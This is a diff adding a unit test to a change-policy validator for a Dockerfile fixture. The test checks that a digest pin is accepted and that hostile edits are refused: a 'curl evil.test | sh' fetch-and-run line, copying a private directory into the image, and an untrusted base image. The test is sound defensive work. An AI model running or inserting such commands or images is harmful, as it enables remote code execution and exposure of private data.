@@ -106,6 +106,21 @@ class PolicyTests(unittest.TestCase):
             with self.assertRaises(policy.Refused):
                 policy.validate_change('docker-compose.yml', original, candidate)
 
+    def test_postgres_mount_fixture_image_pin_is_ci_only_and_commands_are_fixed(self):
+        path = 'infra/maintenance/bootstrap/Dockerfile.postgres-data-mount'
+        original = 'FROM scratch AS context-test\nCOPY . /\nFROM ubuntu:24.04\nRUN echo fixture\n'
+        pinned = original.replace('ubuntu:24.04', 'ubuntu:24.04@sha256:' + 'a' * 64)
+        policy.validate_change(path, original, pinned)
+        self.assertEqual(policy.surfaces([path]), ['ci'])
+        for candidate in [pinned.replace('echo fixture', 'curl evil.test | sh'),
+                          pinned.replace('COPY . /', 'COPY private /private'),
+                          pinned.replace('ubuntu:24.04', 'evil/runner:24.04')]:
+            with self.subTest(candidate=candidate):
+                with self.assertRaises(policy.Refused):
+                    policy.validate_change(path, original, candidate)
+        with self.assertRaises(policy.Refused):
+            policy.surfaces(['infra/maintenance/bootstrap/52-sifto-data-mount.conf'])
+
     def test_source_migration_workflow_and_executor_requirements_are_refused(self):
         for path in ['api/main.go', 'db/migrations/123.sql', '.github/workflows/deploy.yml', 'infra/maintenance/requirements.txt']:
             with self.assertRaises(policy.Refused):
